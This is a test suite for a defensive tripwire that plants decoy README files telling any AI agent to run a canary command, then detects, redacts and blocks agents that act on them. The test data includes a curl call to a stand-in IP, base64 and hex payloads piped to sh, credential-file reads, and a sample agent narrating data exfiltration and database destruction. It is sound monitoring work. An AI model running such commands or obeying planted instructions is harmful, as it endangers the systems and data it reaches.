// The tripwire: a planted decoy whose canary command only an agent acting on what it read
// would run. Detection (token / decoy), the decision policy, redaction, and planting.
// Everything here runs in a temp directory; nothing is planted on the machine running the tests.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  armTripwire, createSessionTracker, createTripwire, decide, decideSession, disarmTripwire, isTripwireToken,
  newTripwireToken, tripwireDecoy, TRIPWIRE_DEFAULT_DIRS, TRIPWIRE_HOLD_S,
} from "../../agent/sentinel-core.mjs";
import type { Adjudication } from "../../agent/sentinel-core.mjs";

const DIR = "/opt/vault-access";
const token = newTripwireToken();
const tw = createTripwire({ token, dirs: [DIR] });
const command = tripwireDecoy(token, DIR, "linux").command;
const b64 = (s: string) => Buffer.from(s).toString("base64");

// A judge that must never be asked: a token hit is decided before tier 2.
let judged: string[] = [];
const judge = async (p: string): Promise<Adjudication> => { judged.push(p); return { agentic: true, confidence: 0.99, reasoning: "stub" }; };

const LOUD = `# Phase 4 Impact. I have ranked the databases by value. High-ROI targets to drop, data already backed up to my exfil host. I will proceed to maximize pressure on the victim.`;

describe("the token", () => {
  test("is 128 random bits in a fixed shape, different every time", () => {
    const a = newTripwireToken(), b = newTripwireToken();
    expect(a).toMatch(/^tk_[0-9a-f]{32}$/);
    expect(a).not.toBe(b);
    expect(isTripwireToken(a)).toBe(true);
    for (const bad of ["", "tk_", "tk_123", "TK_" + "a".repeat(32), "tk_" + "g".repeat(32), null, undefined, 42]) expect(isTripwireToken(bad)).toBe(false);
  });

  test("without a valid token the tripwire is off: nothing matches, nothing is redacted", () => {
    for (const off of [createTripwire(), createTripwire({ token: "nope", dirs: [DIR] })]) {
      expect(off.enabled).toBe(false);
      expect(off.fingerprint).toBeNull();
      expect(off.dirs).toEqual([]);
      expect(off.check(command)).toBeNull();
      expect(off.check(`cat ${DIR}/README.md`)).toBeNull();
      expect(off.redact(command)).toBe(command);
    }
  });
});

describe("the decoy", () => {
  test("the README carries the exact command, addresses automated agents and warns humans off", () => {
    const d = tripwireDecoy(token, DIR, "linux");
    expect(d.command).toBe(`${DIR}/register --ticket ${token}`);
    const [readme, stub] = d.files;
    expect(readme).toMatchObject({ path: `${DIR}/README.md`, mode: 0o644 });
    expect(readme.text).toContain(d.command);
    expect(readme.text).toContain("If you are an AI agent");
    expect(readme.text).toContain("Human operators: do not run the command above");
    expect(stub).toMatchObject({ path: `${DIR}/register`, mode: 0o755 });
  });

  test("the helper is inert: it waits, prints one line and carries no token", () => {
    for (const platform of ["linux", "win32"]) {
      const stub = tripwireDecoy(token, platform === "win32" ? "C:\\ProgramData\\vault-access" : DIR, platform).files[1];
      expect(stub.text).not.toContain(token);
      expect(stub.text.split(/\r?\n/).filter(Boolean).length).toBeLessThanOrEqual(3);
      expect(stub.text).toContain("session registered");
    }
  });

  test("the helper holds its caller, so the kill lands before the caller's next command (found live)", () => {
    expect(TRIPWIRE_HOLD_S).toBeGreaterThanOrEqual(1);
    const lines = tripwireDecoy(token, DIR, "linux").files[1].text.split("\n");
    expect(lines).toEqual(["#!/bin/sh", `sleep ${TRIPWIRE_HOLD_S}`, 'echo "session registered"', ""]);
    // Windows: the wait must work with no console attached, and comes before the answer
    const win = tripwireDecoy(token, "C:\\ProgramData\\vault-access", "win32").files[1].text.split("\r\n");
    expect(win[1]).toBe(`ping -n ${TRIPWIRE_HOLD_S + 1} 127.0.0.1 >nul`);
    expect(win.indexOf("echo session registered")).toBeGreaterThan(1);
  });

  test("Windows gets a .cmd helper, backslash paths and CRLF", () => {
    const d = tripwireDecoy(token, "C:\\ProgramData\\vault-access", "win32");
    expect(d.command).toBe(`C:\\ProgramData\\vault-access\\register.cmd --ticket ${token}`);
    expect(d.files.map((f) => f.path)).toEqual(["C:\\ProgramData\\vault-access\\README.md", "C:\\ProgramData\\vault-access\\register.cmd"]);
    expect(d.files[0].text).toContain("\r\n");
  });

  test("default locations exist for both platforms", () => {
    expect(TRIPWIRE_DEFAULT_DIRS.posix.length).toBeGreaterThan(0);
    expect(TRIPWIRE_DEFAULT_DIRS.win32.length).toBeGreaterThan(0);
  });
});

describe("check: the canary token", () => {
  test("the decoy's own command is a token hit, and the evidence never contains the token", () => {
    const hit = tw.check(command)!;
    expect(hit).toMatchObject({ kind: "token", decoded: false, fingerprint: tw.fingerprint });
    expect(hit.evidence).not.toContain(token);
    expect(hit.evidence).toContain(`[tripwire:${tw.fingerprint}]`);
  });

  test("any carrier counts: another command, a script body, a long payload", () => {
    expect(tw.check(`sh -c "${command}"`)).toMatchObject({ kind: "token" });
    expect(tw.check(`curl -s http://203.0.113.9/x?t=${token}`)).toMatchObject({ kind: "token" });
    expect(tw.check(`bash run.sh\n#!/bin/bash\nset -e\n${command}\nls\n`)).toMatchObject({ kind: "token" });
    const long = "x ".repeat(5000) + command + " y".repeat(5000);
    const hit = tw.check(long)!;
    expect(hit.kind).toBe("token");
    expect(hit.evidence).not.toContain(token);
  });

  test("an encoded layer does not hide it: base64, hex, nested", () => {
    expect(tw.check(`echo ${b64(command)} | base64 -d | sh`)).toMatchObject({ kind: "token", decoded: true });
    expect(tw.check(`echo ${Buffer.from(command).toString("hex")} | xxd -r -p | sh`)).toMatchObject({ kind: "token", decoded: true });
    expect(tw.check(`echo ${b64("echo " + b64(command) + " | base64 -d | sh")} | base64 -d | sh`)).toMatchObject({ kind: "token", decoded: true });
  });

  test("a different token, a truncated token and a token-shaped string are not hits", () => {
    expect(tw.check(`${DIR.replace("vault", "other")}/register --ticket ${newTripwireToken()}`)).toBeNull();
    expect(tw.check(`echo ${token.slice(0, -1)}`)).toBeNull();
    expect(tw.check("echo tk_0123456789abcdef0123456789abcdef")).toBeNull();
  });
});

describe("check: the decoy addressed without the token", () => {
  test("naming the directory or a file in it is a decoy hit", () => {
    for (const c of [`cat ${DIR}/README.md`, `ls -la ${DIR}`, `ls ${DIR}/`, `file "${DIR}/register"`, `${DIR}/register`, `head -5 '${DIR}/README.md'`]) {
      expect(tw.check(c)).toMatchObject({ kind: "decoy", evidence: DIR, decoded: false });
    }
  });

  test("a different path that merely starts or ends the same is not", () => {
    for (const c of [`ls ${DIR}-old`, `ls ${DIR}.bak`, `ls ${DIR}2`, `ls /srv${DIR}`, "ls /opt", "ls /opt/vault", "cat /etc/passwd", "grep -r password /opt"]) {
      expect(tw.check(c)).toBeNull();
    }
  });

  test("a command run from inside the decoy is a hit, wherever it points", () => {
    expect(tw.check("ls -la", { cwd: DIR })).toMatchObject({ kind: "decoy" });
    expect(tw.check("cat README.md", { cwd: `${DIR}/` })).toMatchObject({ kind: "decoy" });
    expect(tw.check("ls -la", { cwd: "/opt" })).toBeNull();
    expect(tw.check("ls -la", { cwd: `${DIR}-old` })).toBeNull();
  });

  test("a relative path is resolved against the process's cwd", () => {
    expect(tw.check("cat vault-access/README.md", { cwd: "/opt" })).toMatchObject({ kind: "decoy" });
    expect(tw.check("cat ../opt/vault-access/README.md", { cwd: "/tmp" })).toMatchObject({ kind: "decoy" });
    expect(tw.check("cat vault-access/README.md", { cwd: "/srv" })).toBeNull();
    expect(tw.check("cat vault-access/README.md")).toBeNull(); // no cwd: a relative path is unresolvable, we do not guess
    expect(tw.check("cat vault-access/README.md", { cwd: "relative/cwd" })).toBeNull();
  });

  test("Windows paths match whatever the case or slash direction", () => {
    const w = createTripwire({ token, dirs: ["C:\\ProgramData\\vault-access"] });
    expect(w.check("Get-Content C:\\ProgramData\\vault-access\\README.md")).toMatchObject({ kind: "decoy" });
    expect(w.check("gc c:\\programdata\\VAULT-ACCESS\\readme.md")).toMatchObject({ kind: "decoy" });
    expect(w.check("type C:/ProgramData/vault-access/README.md")).toMatchObject({ kind: "decoy" });
    expect(w.check("dir C:\\ProgramData\\vault-access-old")).toBeNull();
    expect(w.check("dir C:\\ProgramData")).toBeNull();
  });

  test("the token outranks the decoy path (the decoy's command names both)", () => {
    expect(tw.check(command)!.kind).toBe("token");
  });
});

describe("redact", () => {
  test("takes the token out, plain or encoded, and leaves everything else alone", () => {
    expect(tw.redact(command)).toBe(`${DIR}/register --ticket [tripwire:${tw.fingerprint}]`);
    expect(tw.redact(`a ${token} b ${token}`)).toBe(`a [tripwire:${tw.fingerprint}] b [tripwire:${tw.fingerprint}]`);
    const enc = `echo ${b64(command)} | base64 -d | sh`;
    expect(tw.redact(enc)).toBe("echo [encoded tripwire] | base64 -d | sh");
    const hex = Buffer.from(command).toString("hex");
    expect(tw.redact(`xxd -r -p <<< ${hex}`)).not.toContain(hex);
    const plain = `python3 /usr/local/lib/some/long/path/without/the/token.py --flag ${b64("just some ordinary base64 text here")}`;
    expect(tw.redact(plain)).toBe(plain);
    expect(tw.redact("")).toBe("");
  });

  test("a redacted line can be fed back in without tripping the wire", () => {
    for (const c of [command, `echo ${b64(command)} | base64 -d | sh`]) {
      const again = tw.check(tw.redact(c));
      expect(again === null || again.kind === "decoy").toBe(true);
    }
  });
});

describe("decide() with a tripwire", () => {
  beforeAll(() => { judged = []; });

  test("the canary command is a BLOCK at tier 1 with no judge call, whatever the narration score", async () => {
    const d = await decide(command, { tripwire: tw, adjudicator: judge });
    expect(d).toMatchObject({ decision: "block", tier: 1, viaTripwire: true, score: 0, verdict: "clear" });
    expect(d.signals).toEqual(["tripwire_token"]);
    expect(d.tripwire).toMatchObject({ kind: "token", decoded: false });
    expect(d.reason).toContain("canary command was executed");
    expect(judged).toEqual([]);
    expect(JSON.stringify(d)).not.toContain(token); // nothing in the result carries the token
  });

  test("an escalate-band payload that carries the token is not sent to the judge either", async () => {
    const thin = `# I'll check what this account can reach first.\n${command}`;
    const d = await decide(thin, { tripwire: tw, adjudicator: judge });
    expect(d).toMatchObject({ decision: "block", tier: 1, viaTripwire: true });
    expect(judged).toEqual([]);
    expect(JSON.stringify(d)).not.toContain(token);
  });

  test("an encoded canary command blocks and says so", async () => {
    const d = await decide(`echo ${b64(command)} | base64 -d | sh`, { tripwire: tw });
    expect(d).toMatchObject({ decision: "block", viaTripwire: true });
    expect(d.reason).toContain("inside an encoded layer");
  });

  test("a look at the decoy is an ALERT, never a block, and keeps the underlying reason", async () => {
    const d = await decide(`cat ${DIR}/README.md`, { tripwire: tw });
    expect(d).toMatchObject({ decision: "alert", tier: 1, viaTripwire: true });
    expect(d.signals).toEqual(["tripwire_decoy"]);
    expect(d.tripwire).toMatchObject({ kind: "decoy", evidence: DIR });
    expect(d.reason).toContain("-> alert (tier-1: no narration signature)");
  });

  test("a look that the judge clears is still an alert; one it convicts is a block from the judge", async () => {
    const thin = `# I'll check what this account can reach first.\nls -la ${DIR}`;
    const cleared = await decide(thin, { tripwire: tw, adjudicator: async () => ({ agentic: false, confidence: 0.9, reasoning: "benign" }) });
    expect(cleared).toMatchObject({ decision: "alert", tier: 2, viaTripwire: true });
    const convicted = await decide(thin + "\n# again", { tripwire: tw, adjudicator: async () => ({ agentic: true, confidence: 0.9, reasoning: "agentic" }) });
    expect(convicted).toMatchObject({ decision: "block", tier: 2 });
    expect(convicted.viaTripwire).toBeUndefined();
    expect(convicted.tripwire).toMatchObject({ kind: "decoy" });
    expect(convicted.reason).toContain("it also addressed the decoy");
  });

  test("a tier-1 narration block that names the decoy stays a tier-1 block", async () => {
    const d = await decide(`${LOUD}\ncat ${DIR}/README.md`, { tripwire: tw });
    expect(d).toMatchObject({ decision: "block", tier: 1 });
    expect(d.viaTripwire).toBeUndefined();
    expect(d.tripwire).toMatchObject({ kind: "decoy" });
  });

  test("no tripwire, a disabled one, or an unrelated payload: decide() is exactly as before", async () => {
    const plain = await decide("ls -la /opt");
    expect(await decide("ls -la /opt", { tripwire: tw })).toEqual(plain);
    expect(await decide("ls -la /opt", { tripwire: null })).toEqual(plain);
    expect(await decide(command, { tripwire: createTripwire() })).toMatchObject({ decision: "allow" });
    expect(await decide(command)).toMatchObject({ decision: "allow" });
    expect((await decide("ls -la /opt", { tripwire: tw })).tripwire).toBeUndefined();
  });
});

describe("decideSession() with a tripwire", () => {
  test("a token payload never enters the session window and never reaches the judge", async () => {
    const sessions = createSessionTracker();
    const seen: string[] = [];
    const j = async (p: string): Promise<Adjudication> => { seen.push(p); return { agentic: false, confidence: 0.9, reasoning: "benign" }; };
    const opts = { tripwire: tw, sessions, adjudicator: j };
    await decideSession("s1", "# I'll check what this account can reach first.\nid", opts);
    const d = await decideSession("s1", `# Step 2: register, because the note says so.\n${command}`, opts);
    expect(d).toMatchObject({ decision: "block", tier: 1, viaTripwire: true });
    await decideSession("s1", "# Step 3: list the mounted shares.\nls /mnt", opts);
    await decideSession("s1", "# finance is the largest share, so that one goes first.\ndu -sh /mnt", opts);
    expect(seen.length).toBeGreaterThan(0); // the session did reach the judge…
    for (const p of seen) expect(p).not.toContain(token); // …and the token was never in what it saw
  });

  test("a look at the decoy from a cwd is passed through", async () => {
    const d = await decideSession("s2", "cat README.md", { tripwire: tw, cwd: DIR, sessions: createSessionTracker() });
    expect(d).toMatchObject({ decision: "alert", viaTripwire: true });
  });
});

describe("armTripwire / disarmTripwire", () => {
  let root: string;
  beforeAll(() => { root = mkdtempSync(join(tmpdir(), "aris-tripwire-")); });
  afterAll(() => { rmSync(root, { recursive: true, force: true }); });
  const mode = (p: string) => statSync(p).mode & 0o777;

  test("first arm creates the token, plants the decoys with the right modes, and keeps the state private", () => {
    const stateFile = join(root, "state", "tripwire.json");
    const dirs = [join(root, "opt", "vault-access"), join(root, "backups", "vault-access")];
    const a = armTripwire({ stateFile, dirs, platform: "linux" });
    expect(a.error).toBeNull();
    expect(a.created).toBe(true);
    expect(a.planted).toEqual(dirs);
    expect(a.skipped).toEqual([]);
    expect(a.tripwire!.enabled).toBe(true);
    expect(a.tripwire!.dirs).toEqual(dirs);
    const state = JSON.parse(readFileSync(stateFile, "utf8"));
    expect(isTripwireToken(state.token)).toBe(true);
    expect(mode(stateFile)).toBe(0o600);
    for (const d of dirs) {
      expect(mode(join(d, "README.md"))).toBe(0o644);
      expect(mode(join(d, "register"))).toBe(0o755);
      expect(readFileSync(join(d, "README.md"), "utf8")).toContain(`${join(d, "register")} --ticket ${state.token}`);
    }
    // the planted command trips the wire it belongs to
    expect(a.tripwire!.check(tripwireDecoy(state.token, dirs[0], "linux").command)).toMatchObject({ kind: "token" });
    expect(a.tripwire!.check(`cat ${dirs[1]}/README.md`)).toMatchObject({ kind: "decoy" });
  });

  test("a restart keeps the token and puts back a decoy that was deleted or edited", () => {
    const stateFile = join(root, "state", "tripwire.json");
    const dirs = [join(root, "opt", "vault-access"), join(root, "backups", "vault-access")];
    const before = JSON.parse(readFileSync(stateFile, "utf8")).token;
    rmSync(dirs[0], { recursive: true, force: true });
    writeFileSync(join(dirs[1], "README.md"), "tampered\n");
    const a = armTripwire({ stateFile, dirs, platform: "linux" });
    expect(a.created).toBe(false);
    expect(JSON.parse(readFileSync(stateFile, "utf8")).token).toBe(before);
    expect(a.tripwire!.fingerprint).toBe(createTripwire({ token: before }).fingerprint);
    expect(readFileSync(join(dirs[0], "README.md"), "utf8")).toContain(before);
    expect(readFileSync(join(dirs[1], "README.md"), "utf8")).toContain(before);
    expect(JSON.parse(readFileSync(stateFile, "utf8")).decoys).toHaveLength(2); // not duplicated
  });

  test("a directory that already exists and is not ours is never touched", () => {
    const stateFile = join(root, "state2", "tripwire.json");
    const theirs = join(root, "theirs");
    mkdirSync(theirs);
    writeFileSync(join(theirs, "README.md"), "a real README\n");
    const mine = join(root, "mine");
    const a = armTripwire({ stateFile, dirs: [theirs, mine], platform: "linux" });
    expect(a.planted).toEqual([mine]);
    expect(a.skipped).toEqual([{ dir: theirs, why: "already exists and is not ours" }]);
    expect(readFileSync(join(theirs, "README.md"), "utf8")).toBe("a real README\n");
    expect(existsSync(join(theirs, "register"))).toBe(false);
    expect(a.tripwire!.dirs).toEqual([mine]);
    expect(a.tripwire!.check(`cat ${theirs}/README.md`)).toBeNull();
  });

  test("it never throws: no state file, or an unwritable one, is reported and nothing is planted", () => {
    expect(armTripwire({ dirs: [join(root, "never")] })).toMatchObject({ tripwire: null, error: "no state file" });
    const blocker = join(root, "a-file");
    writeFileSync(blocker, "x");
    const a = armTripwire({ stateFile: join(blocker, "sub", "tripwire.json"), dirs: [join(root, "never")], platform: "linux" });
    expect(a.tripwire).toBeNull();
    expect(a.error).toBeTruthy();
    expect(existsSync(join(root, "never"))).toBe(false);
  });

  test("disarm removes only what was planted, keeps a directory somebody else put files in, and forgets the token", () => {
    const stateFile = join(root, "state", "tripwire.json");
    const dirs = [join(root, "opt", "vault-access"), join(root, "backups", "vault-access")];
    writeFileSync(join(dirs[1], "someone-elses.txt"), "keep me\n");
    const r = disarmTripwire({ stateFile });
    expect(r.armed).toBe(true);
    expect(existsSync(dirs[0])).toBe(false);
    expect(existsSync(join(dirs[1], "README.md"))).toBe(false);
    expect(existsSync(join(dirs[1], "register"))).toBe(false);
    expect(readFileSync(join(dirs[1], "someone-elses.txt"), "utf8")).toBe("keep me\n");
    expect(r.kept).toEqual([dirs[1]]);
    expect(existsSync(stateFile)).toBe(false);
    expect(existsSync(join(root, "opt"))).toBe(true); // parents are not ours to remove
    expect(disarmTripwire({ stateFile })).toEqual({ removed: [], kept: [], armed: false });
    expect(disarmTripwire()).toEqual({ removed: [], kept: [], armed: false });
  });

  test("a corrupt state file is treated as no state (a fresh token), never a crash", () => {
    const stateFile = join(root, "state3", "tripwire.json");
    mkdirSync(join(root, "state3"));
    writeFileSync(stateFile, "{not json");
    const a = armTripwire({ stateFile, dirs: [join(root, "fresh")], platform: "linux" });
    expect(a.error).toBeNull();
    expect(a.created).toBe(true);
    expect(a.planted).toEqual([join(root, "fresh")]);
  });
});
